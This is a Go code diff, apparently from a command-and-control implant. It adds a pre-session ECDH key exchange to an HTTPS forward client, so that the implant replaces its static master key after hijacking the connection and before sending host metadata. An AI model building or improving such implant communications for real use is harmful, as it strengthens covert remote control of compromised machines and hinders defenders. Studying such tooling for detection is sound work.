@@ -5,6 +5,7 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
+	"encoding/binary"
 	"fmt"
 	"implant/core/app"
 	"implant/core/communication"
@@ -161,6 +162,48 @@ func (c *HTTPSForwardClient) Connect(spec string) error {
 	return nil
 }
 
+// kxHandshake 会话前密钥交换（与 tcp_forward 同协议）。
+//
+// 时机：hijack 已把连接转成裸流（tcp 分帧），所以在写元数据之前发 KX 帧即可。
+// 服务端复用 tcp.HandleTcpConnectionForWithKeys，KX case 在共享循环里，无需改动。
+func (c *HTTPSForwardClient) kxHandshake() {
+	kx, err := encrypt.NewKeyExchange()
+	if err != nil {
+		return
+	}
+	if c.Connection == nil {
+		return
+	}
+	if err := c.rawSend(utils.BytesCombine(utils.WriteInt(kxMsgType), []byte(kx.HeaderValue()))); err != nil {
+		return
+	}
+	total, err := communication.ReadFramedLength(c.reader)
+	if err != nil || total < 8 {
+		return
+	}
+	payload, err := communication.ReadFramedPayload(c.reader, total)
+	if err != nil || len(payload) < 4 {
+		return
+	}
+	if int(binary.BigEndian.Uint32(payload[:4])) != kxMsgType {
+		return
+	}
+	peerPub, err := encrypt.ParsePeerPublicKey(string(payload[4:]))
+	if err != nil {
+		return
+	}
+	salt, _ := app.GetListenerKeyConfig(listenerType)
+	masterKey, err := kx.DeriveMasterKey(peerPub, salt[:16])
+	if err != nil {
+		return
+	}
+	if err := encrypt.GlobalClientKeyManager.ReplaceMasterKey(masterKey); err != nil {
+		return
+	}
+	utils.MetaInfo = nil
+	debuglog.Printf("🔑 [%s-KX] 会话前密钥交换完成，已替换静态主密钥\n", listenerType)
+}
+
 // handleConn 服务端拨号后的 HTTPS handler：Hijack 连接并转为原始协议流
 func (c *HTTPSForwardClient) handleConn(w http.ResponseWriter, r *http.Request) {
 	hj, ok := w.(http.Hijacker)
@@ -193,6 +236,13 @@ func (c *HTTPSForwardClient) handleConn(w http.ResponseWriter, r *http.Request) 
 	c.reader = buf.Reader
 	c.connected = true
 	debuglog.Printf("✅ [HTTPS-FORWARD] 服务端连入: %s\n", conn.RemoteAddr())
+
+	// 会话前 ECDH 交换。
+	//
+	// 服务端侧**无需改动**：dialHTTPForwardSession 的协议循环复用
+	// tcp.HandleTcpConnectionForWithKeys，KX case 已在共享的消息循环里。
+	// hijack 之后连接已是裸流（tcp 分帧），所以交换方式与 tcp_forward 完全一致。
+	c.kxHandshake()
 
 	// MetaInfo + FirstBlood
 	if len(utils.MetaInfo) == 0 {
